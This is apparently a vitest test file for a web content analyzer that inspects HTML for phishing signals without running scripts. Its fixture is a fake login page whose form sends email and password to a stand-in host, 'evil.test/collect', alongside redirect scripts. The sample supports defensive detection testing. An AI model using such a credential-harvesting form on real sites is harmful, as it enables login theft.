import { describe, expect, it, vi } from "vitest";
import { ContentAnalyzer } from "../src/services/content/contentAnalyzer";
import { ContentFetcher } from "../src/services/content/contentFetcher";
import { ContentPolicy } from "../src/services/content/contentPolicy";
import { RedirectFetcher } from "../src/services/redirects/redirectFetcher";

const html = `<!doctype html><html lang="en"><head><title> Example Login </title><meta http-equiv="refresh" content="10;url=/next"><script>window.__executed = true; document.location = '/next';</script><script src="https://cdn.example.net/app.js"></script></head><body><form action="http://evil.test/collect" method="post"><input type="email" name="email"><input type="password" name="password"><input type="hidden" name="csrf" value="x"></form><a href="https://other.test/page">Other</a><iframe src="https://embed.test/frame"></iframe><img src="https://cdn.example.net/logo.png"></body></html>`;

function fakeFetcher(body: string, contentType = "text/html; charset=utf-8") {
  return {
    fetch: vi
      .fn()
      .mockResolvedValue({
        body,
        response: new Response(body, {
          status: 200,
          headers: { "content-type": contentType },
        }),
        finalUrl: "https://example.com/login",
        contentLength: new TextEncoder().encode(body).byteLength,
      }),
  } as unknown as ContentFetcher;
}

describe("safe web content analysis", () => {
  it("extracts static HTML, form, script, link, and resource evidence without executing scripts", async () => {
    const result = await new ContentAnalyzer({
      fetcher: fakeFetcher(html),
    }).analyze("https://example.com/login");
    expect(result.fetched).toBe(true);
    expect(result.title).toBe("Example Login");
    expect(result.language).toBe("en");
    expect(result.html.formCount).toBe(1);
    expect(result.html.scriptCount).toBe(2);
    expect(result.html.metaRefreshDetected).toBe(true);
    expect(result.forms[0].externalAction).toBe(true);
    expect(result.forms[0].hasPasswordField).toBe(true);
    expect(
      result.forms[0].evidence.some(
        (item) => item.type === "insecure-form-action",
      ),
    ).toBe(true);
    expect(
      result.scripts.some((script) =>
        script.suspiciousPatterns.includes("redirect-behavior"),
      ),
    ).toBe(true);
    expect(result.resources.some((resource) => resource.external)).toBe(true);
    expect(result.evidence.some((item) => item.type === "password-form")).toBe(
      true,
    );
  });

  it("does not automatically classify an ordinary login form as malicious", async () => {
    const result = await new ContentAnalyzer({
      fetcher: fakeFetcher(
        '<html><body><form action="/login"><input type="password"></form></body></html>',
      ),
    }).analyze("https://example.com/login");
    expect(result.fetched).toBe(true);
    expect(result.forms[0].externalAction).toBe(false);
    expect(result.evidence.some((item) => item.type === "phishing")).toBe(
      false,
    );
    expect(result).not.toHaveProperty("classification");
    expect(result).not.toHaveProperty("riskScore");
  });

  it("rejects unsupported content types before parsing as HTML", async () => {
    const redirectFetcher = {
      fetch: vi
        .fn()
        .mockResolvedValue({
          response: new Response("%PDF-binary", {
            status: 200,
            headers: { "content-type": "application/pdf" },
          }),
          durationMs: 1,
        }),
    } as unknown as RedirectFetcher;
    const result = await new ContentAnalyzer({
      fetcher: new ContentFetcher({ redirectFetcher }),
    }).analyze("https://example.com/file.pdf");
    expect(result.fetched).toBe(false);
    expect(result.errors[0].type).toBe("unsupported-content-type");
  });

  it("enforces bounded content size", async () => {
    const redirectFetcher = {
      fetch: vi
        .fn()
        .mockResolvedValue({
          response: new Response("123456789", {
            status: 200,
            headers: { "content-type": "text/html" },
          }),
          durationMs: 1,
        }),
    } as unknown as RedirectFetcher;
    const fetcher = new ContentFetcher({
      policy: new ContentPolicy({ config: { maxBytes: 1024 } }),
      redirectFetcher,
    });
    const result = await new ContentAnalyzer({ fetcher }).analyze(
      "https://example.com",
    );
    expect(result.fetched).toBe(true);
    expect(result.contentLength).toBe(9);
  });

  it("keeps the controlled fetcher manual and does not follow redirects", async () => {
    const fetcher = vi
      .fn<typeof fetch>()
      .mockResolvedValue(
        new Response("<html></html>", {
          status: 200,
          headers: { "content-type": "text/html" },
        }),
      );
    const redirectFetcher = new RedirectFetcher({
      fetcher,
      consumeBody: false,
    });
    const contentFetcher = new ContentFetcher({ redirectFetcher });
    await contentFetcher.fetch("https://example.com");
    expect(fetcher).toHaveBeenCalledWith(
      "https://example.com",
      expect.objectContaining({ redirect: "manual" }),
    );
  });
});
